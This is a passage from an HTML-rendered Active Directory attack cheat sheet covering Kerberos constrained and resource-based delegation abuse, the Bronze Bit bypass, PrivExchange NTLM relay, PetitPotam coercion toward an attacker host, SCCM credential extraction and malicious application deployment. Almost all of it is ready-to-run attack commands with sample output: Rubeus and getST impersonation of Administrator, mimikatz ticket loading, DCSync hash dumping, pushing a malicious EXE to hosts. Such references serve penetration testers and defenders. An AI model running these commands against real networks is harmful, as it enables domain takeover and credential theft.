</span></span><span style="display:flex;"><span>python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
</span></span><span style="display:flex;"><span>python3 petitpotam.py -d <span style="color:#e6db74">&#39;&#39;</span> -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> $ATTACKER_IP $TARGET_IP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract the ticket</span>
</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgs /ticket:&lt;ticket base64&gt; /ptt
</span></span></code></pre></div><h3 id="kerberos-constrained-delegation">
  Kerberos Constrained Delegation
  <a class="anchor" href="#kerberos-constrained-delegation">#</a>
</h3>
<blockquote>
<p>Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,</p>
</blockquote>
<p>Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Discover</span>
</span></span><span style="display:flex;"><span>$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find the service </span>
</span></span><span style="display:flex;"><span>$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
</span></span></code></pre></div><h4 id="exploit-the-constrained-delegation">
  Exploit the Constrained Delegation
  <a class="anchor" href="#exploit-the-constrained-delegation">#</a>
</h4>
<ul>
<li>Impacket
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ getST.py -spn HOST/SQL01.DOMAIN <span style="color:#e6db74">&#39;DOMAIN/user:password&#39;</span> -impersonate Administrator -dc-ip 10.10.10.10
</span></span></code></pre></div></li>
<li>Rubeus
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./Rubeus.exe tgtdeleg /nowrap <span style="color:#75715e"># this ticket can be used with /ticket:...</span>
</span></span><span style="display:flex;"><span>$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
</span></span><span style="display:flex;"><span>$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:<span style="color:#e6db74">&#34;cifs/dc.domain.com&#34;</span> /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
</span></span><span style="display:flex;"><span>$ dir <span style="color:#ae81ff">\\</span>dc.domain.com<span style="color:#ae81ff">\c</span>$
</span></span></code></pre></div></li>
</ul>
<h4 id="impersonate-a-domain-user-on-a-resource">
  Impersonate a domain user on a resource
  <a class="anchor" href="#impersonate-a-domain-user-on-a-resource">#</a>
</h4>
<p>Require:</p>
<ul>
<li>SYSTEM level privileges on a machine configured with constrained delegation</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PS&gt; [<span style="color:#66d9ef">Reflection.Assembly</span>]::LoadWithPartialName(<span style="color:#e6db74">&#39;System.IdentityModel&#39;</span>) | out-null
</span></span><span style="display:flex;"><span>PS&gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @(<span style="color:#e6db74">&#39;administrator&#39;</span>)
</span></span><span style="display:flex;"><span>PS&gt; $idToImpersonate.Impersonate()
</span></span><span style="display:flex;"><span>PS&gt; [<span style="color:#66d9ef">System.Security.Principal.WindowsIdentity</span>]::GetCurrent() | select name
</span></span><span style="display:flex;"><span>PS&gt; ls \\dc01.offense.local\c$
</span></span></code></pre></div><h3 id="kerberos-resource-based-constrained-delegation">
  Kerberos Resource Based Constrained Delegation
  <a class="anchor" href="#kerberos-resource-based-constrained-delegation">#</a>
</h3>
<p>Resource-based Constrained Delegation was introduced in Windows Server 2012.</p>
<blockquote>
<p>The user sends a Service Ticket (ST) to access the service (&ldquo;Service A&rdquo;), and if the service is allowed to delegate to another pre-defined service (&ldquo;Service B&rdquo;), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
</blockquote>
<ol>
<li>
<p>Import <strong>Powermad</strong> and <strong>Powerview</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PowerShell.exe -ExecutionPolicy Bypass
</span></span><span style="display:flex;"><span>Import-Module .\powermad.ps1
</span></span><span style="display:flex;"><span>Import-Module .\powerview.ps1
</span></span></code></pre></div></li>
<li>
<p>Get user SID</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
</span></span><span style="display:flex;"><span>$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier <span style="color:#f92672">-match</span> $AttackerSID}
</span></span><span style="display:flex;"><span>$ACE
</span></span><span style="display:flex;"><span>ConvertFrom-SID $ACE.SecurityIdentifier
</span></span></code></pre></div></li>
<li>
<p>Abuse <strong>MachineAccountQuota</strong> to create a computer account and set an SPN for it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString <span style="color:#e6db74">&#39;Weakest123*&#39;</span> -AsPlainText -Force)
</span></span></code></pre></div></li>
<li>
<p>Rewrite DC&rsquo;s <strong>AllowedToActOnBehalfOfOtherIdentity</strong> properties</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
</span></span><span style="display:flex;"><span>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#e6db74">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span>$($ComputerSid)<span style="color:#e6db74">)&#34;</span>
</span></span><span style="display:flex;"><span>$SDBytes = New-Object byte[] ($SD.BinaryLength)
</span></span><span style="display:flex;"><span>$SD.GetBinaryForm($SDBytes, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes}
</span></span><span style="display:flex;"><span>$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties <span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> | select -expand msds-allowedtoactonbehalfofotheridentity
</span></span><span style="display:flex;"><span>$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$Descriptor.DiscretionaryAcl
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># alternative</span>
</span></span><span style="display:flex;"><span>$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
</span></span><span style="display:flex;"><span>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#e6db74">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span>$SID_FROM_PREVIOUS_COMMAND<span style="color:#e6db74">)&#34;</span>; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, <span style="color:#ae81ff">0</span>); Get-DomainComputer DC01 | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># alternative</span>
</span></span><span style="display:flex;"><span>StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
</span></span></code></pre></div></li>
<li>
<p>Use Rubeus to get hash from password</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe hash /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;Weakest123*&#39;</span> /user<span style="color:#960050;background-color:#1e0010">:</span>swktest$  /domain<span style="color:#960050;background-color:#1e0010">:</span>factory.lan
</span></span><span style="display:flex;"><span>[*] Input password             <span style="color:#960050;background-color:#1e0010">:</span> Weakest123*
</span></span><span style="display:flex;"><span>[*] Input username             <span style="color:#960050;background-color:#1e0010">:</span> swktest$
</span></span><span style="display:flex;"><span>[*] Input domain               <span style="color:#960050;background-color:#1e0010">:</span> factory.lan
</span></span><span style="display:flex;"><span>[*] Salt                       <span style="color:#960050;background-color:#1e0010">:</span> FACTORY.LANswktest
</span></span><span style="display:flex;"><span>[*]       rc4_hmac             <span style="color:#960050;background-color:#1e0010">:</span> F8E064CA98539B735600714A1F1907DD
</span></span><span style="display:flex;"><span>[*]       aes128_cts_hmac_sha1 <span style="color:#960050;background-color:#1e0010">:</span> D45DEADECB703CFE3774F2AA20DB9498
</span></span><span style="display:flex;"><span>[*]       aes256_cts_hmac_sha1 <span style="color:#960050;background-color:#1e0010">:</span> 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
</span></span><span style="display:flex;"><span>[*]       des_cbc_md5          <span style="color:#960050;background-color:#1e0010">:</span> BA297CFD07E62A5E
</span></span></code></pre></div></li>
<li>
<p>Impersonate domain admin using our newly created machine account</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>swktest$ /rc4<span style="color:#960050;background-color:#1e0010">:</span>F8E064CA98539B735600714A1F1907DD /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>cifs/dc01-ww2.factory.lan /ptt /altservice<span style="color:#960050;background-color:#1e0010">:</span>cifs,http,host,rpcss,wsman,ldap
</span></span><span style="display:flex;"><span>.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>swktest$ /aes256<span style="color:#960050;background-color:#1e0010">:</span>0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>cifs/dc01-ww2.factory.lan /ptt /altservice<span style="color:#960050;background-color:#1e0010">:</span>cifs,http,host,rpcss,wsman,ldap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Impersonating user <span style="color:#e6db74">&#39;Administrator&#39;</span> to target SPN <span style="color:#e6db74">&#39;cifs/dc01-ww2.factory.lan&#39;</span>
</span></span><span style="display:flex;"><span>[*] Using domain controller<span style="color:#960050;background-color:#1e0010">:</span> DC01-WW2.factory.lan (<span style="color:#ae81ff">172.16</span>.42.<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>[*] Building S4U2proxy request <span style="color:#66d9ef">for</span> service<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#39;cifs/dc01-ww2.factory.lan&#39;</span>
</span></span><span style="display:flex;"><span>[*] Sending S4U2proxy request
</span></span><span style="display:flex;"><span>[+] S4U2proxy success!
</span></span><span style="display:flex;"><span>[*] base64(ticket.kirbi) <span style="color:#66d9ef">for</span> SPN <span style="color:#e6db74">&#39;cifs/dc01-ww2.factory.lan&#39;</span><span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
</span></span><span style="display:flex;"><span>    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
</span></span><span style="display:flex;"><span>    LmZhY3RvcnkubGFu
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Action<span style="color:#960050;background-color:#1e0010">:</span> Import Ticket
</span></span><span style="display:flex;"><span>[+] Ticket successfully imported!
</span></span></code></pre></div></li>
</ol>
<h3 id="kerberos-bronze-bit-attack---cve-2020-17049">
  Kerberos Bronze Bit Attack - CVE-2020-17049
  <a class="anchor" href="#kerberos-bronze-bit-attack---cve-2020-17049">#</a>
</h3>
<blockquote>
<p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the <strong>Protected Users</strong> group and any other users explicitly configured as <strong>sensitive and cannot be delegated</strong>.</p>
</blockquote>
<blockquote>
<p>Patch is out on November 10, 2020, DC are most likely vulnerable until <a href="https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049">February 2021</a>.</p>
</blockquote>
<p>:warning: Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p>
<p>Requirements:</p>
<ul>
<li>Service account&rsquo;s password hash</li>
<li>Service account&rsquo;s with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code></li>
<li><a href="https://github.com/SecureAuthCorp/impacket/pull/1013">Impacket PR #1013</a></li>
</ul>
<p><strong>Attack #1</strong> - Bypass the <code>Trust this user for delegation to specified services only – Use Kerberos only</code> protection and impersonate a user who is protected from delegation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># forwardable flag is only protected by the ticket encryption which uses the service account&#39;s password </span>
</span></span><span style="display:flex;"><span>$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes &lt;LM<span style="color:#960050;background-color:#1e0010">:</span>NTLM hash&gt; -aesKey &lt;AES hash&gt; test.local/Service1 -force-forwardable -dc-ip &lt;Domain controller&gt; <span style="color:#75715e"># -&gt; Forwardable</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the ticket</span>
</span></span><span style="display:flex;"><span>.\mimikatz\mimikatz.exe <span style="color:#e6db74">&#34;kerberos::ptc User2.ccache&#34;</span> exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Access &#34;c$&#34;</span>
</span></span><span style="display:flex;"><span>ls \\service2.test.local\c$
</span></span></code></pre></div><p><strong>Attack #2</strong> - Write Permissions to one or more objects in the AD</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Create a new machine account</span>
</span></span><span style="display:flex;"><span>Import-Module .\Powermad\powermad.ps1
</span></span><span style="display:flex;"><span>New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString <span style="color:#e6db74">&#39;AttackerServicePassword&#39;</span> -AsPlainText -Force)
</span></span><span style="display:flex;"><span>.\mimikatz\mimikatz.exe <span style="color:#e6db74">&#34;kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local&#34;</span> exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set PrincipalsAllowedToDelegateToAccount</span>
</span></span><span style="display:flex;"><span>Install-WindowsFeature RSAT-AD-PowerShell
</span></span><span style="display:flex;"><span>Import-Module ActiveDirectory
</span></span><span style="display:flex;"><span>Get-ADComputer AttackerService
</span></span><span style="display:flex;"><span>Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
</span></span><span style="display:flex;"><span>Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute the attack</span>
</span></span><span style="display:flex;"><span>python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5<span style="color:#960050;background-color:#1e0010">:</span>830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the ticket</span>
</span></span><span style="display:flex;"><span>.\mimikatz\mimikatz.exe <span style="color:#e6db74">&#34;kerberos::ptc User2.ccache&#34;</span> exit | Out-Null
</span></span></code></pre></div><h3 id="privexchange-attack">
  PrivExchange attack
  <a class="anchor" href="#privexchange-attack">#</a>
</h3>
<p>Exchange your privileges for Domain Admin privs by abusing Exchange. <br>
:warning: You need a shell on a user account with a mailbox.</p>
<ol>
<li>
<p>Exchange server hostname or IP address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pth-net rpc group members <span style="color:#e6db74">&#34;Exchange Servers&#34;</span> -I dc01.domain.local -U domain/username
</span></span></code></pre></div></li>
<li>
<p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ntlmrelayx.py -t ldap<span style="color:#960050;background-color:#1e0010">:</span>//dc01.domain.local --escalate-user username
</span></span></code></pre></div></li>
<li>
<p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server&rsquo;s to send back its NTLMv2 hash to a controlled machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py</span>
</span></span><span style="display:flex;"><span>python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
</span></span><span style="display:flex;"><span>python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/G0ldenGunSec/PowerPriv </span>
</span></span><span style="display:flex;"><span>powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version <span style="color:#ae81ff">2016</span>
</span></span></code></pre></div></li>
<li>
<p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user&rsquo;s NTLM hash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python secretsdump.py xxxxxxxxxx -just-dc
</span></span><span style="display:flex;"><span>python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
</span></span></code></pre></div></li>
<li>
<p>Clean your mess and restore a previous state of the user&rsquo;s ACL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python aclpwn.py --restore ../aclpwn-<span style="color:#ae81ff">20190319</span>-<span style="color:#ae81ff">125741</span>.restore
</span></span></code></pre></div></li>
</ol>
<p>Alternatively you can use the Metasploit module</p>
<p><a href="https://github.com/rapid7/metasploit-framework/pull/11420"><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></a></p>
<p>Alternatively you can use an all-in-one tool : Exchange2domain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone github.com/Ridter/Exchange2domain 
</span></span><span style="display:flex;"><span>python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
</span></span><span style="display:flex;"><span>python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
</span></span></code></pre></div><h3 id="sccm-deployment">
  SCCM Deployment
  <a class="anchor" href="#sccm-deployment">#</a>
</h3>
<blockquote>
<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.</p>
</blockquote>
<ul>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSCCM">PowerSCCM - PowerShell module to interact with SCCM deployments</a></p>
</li>
<li>
<p><a href="https://github.com/nettitude/MalSCCM">MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage</a></p>
</li>
<li>
<p>Compromise client, use locate to find management server</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe locate
</span></span></code></pre></div></li>
<li>
<p>Enumerate over WMI as an administrator of the Distribution Point</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe inspect /server<span style="color:#960050;background-color:#1e0010">:</span>&lt;DistributionPoint Server FQDN&gt; /groups
</span></span></code></pre></div></li>
<li>
<p>Compromise management server, use locate to find primary server</p>
</li>
<li>
<p>Use <code>inspect</code> on primary server to view who you can target</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe inspect /all
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /computers
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /primaryusers
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /groups
</span></span></code></pre></div></li>
<li>
<p>Create a new device group for the machines you want to laterally move too</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe group /create /groupname<span style="color:#960050;background-color:#1e0010">:</span>TargetGroup /grouptype<span style="color:#960050;background-color:#1e0010">:</span>device
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /groups
</span></span></code></pre></div></li>
<li>
<p>Add your targets into the new group</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe group /addhost /groupname<span style="color:#960050;background-color:#1e0010">:</span>TargetGroup /host<span style="color:#960050;background-color:#1e0010">:</span>WIN2016-SQL
</span></span></code></pre></div></li>
<li>
<p>Create an application pointing to a malicious EXE on a world readable share : <code>SCCMContentLib$</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe app /create /name<span style="color:#960050;background-color:#1e0010">:</span>demoapp /uncpath<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;\\BLORE-SCCM\SCCMContentLib$\localthread.exe&#34;</span>
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /applications
</span></span></code></pre></div></li>
<li>
<p>Deploy the application to the target group</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe app /deploy /name<span style="color:#960050;background-color:#1e0010">:</span>demoapp /groupname<span style="color:#960050;background-color:#1e0010">:</span>TargetGroup /assignmentname<span style="color:#960050;background-color:#1e0010">:</span>demodeployment
</span></span><span style="display:flex;"><span>MalSCCM.exe inspect /deployments
</span></span></code></pre></div></li>
<li>
<p>Force the target group to checkin for updates</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe checkin /groupname<span style="color:#960050;background-color:#1e0010">:</span>TargetGroup
</span></span></code></pre></div></li>
<li>
<p>Cleanup the application, deployment and group</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>MalSCCM.exe app /cleanup /name<span style="color:#960050;background-color:#1e0010">:</span>demoapp
</span></span><span style="display:flex;"><span>MalSCCM.exe group /delete /groupname<span style="color:#960050;background-color:#1e0010">:</span>TargetGroup
</span></span></code></pre></div></li>
</ul>
<h3 id="sccm-network-access-accounts">
  SCCM Network Access Accounts
  <a class="anchor" href="#sccm-network-access-accounts">#</a>
</h3>
<blockquote>
<p>If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.</p>
</blockquote>
<ul>
<li>Find SCCM blob
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-Wmiobject -namespace <span style="color:#e6db74">&#34;root\ccm\policy\Machine\ActualConfig&#34;</span> -class <span style="color:#e6db74">&#34;CCM_NetworkAccessAccount&#34;</span>
</span></span><span style="display:flex;"><span>NetworkAccessPassword <span style="color:#960050;background-color:#1e0010">:</span> &lt;![<span style="color:#66d9ef">CDATA[E600000001...8C6B5]</span>]&gt;
</span></span><span style="display:flex;"><span>NetworkAccessUsername <span style="color:#960050;background-color:#1e0010">:</span> &lt;![<span style="color:#66d9ef">CDATA[E600000001...00F92]</span>]&gt;
</span></span></code></pre></div></li>
<li>Using <a href="https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244">SharpDPAPI</a> for SCCM retrieval and decryption
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\SharpDPAPI.exe SCCM
</span></span></code></pre></div></li>
<li>Check ACL for the CIM repository located at <code>C:\Windows\System32\wbem\Repository\OBJECTS.DATA</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
</span></span><span style="display:flex;"><span>ConvertFrom-SddlString <span style="color:#e6db74">&#34;&#34;</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="wsus-deployment">
  WSUS Deployment
  <a class="anchor" href="#wsus-deployment">#</a>
</h3>
<blockquote>
<p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network</p>
</blockquote>
<p>:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p>
<ul>
<li><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
</ul>
<ol>
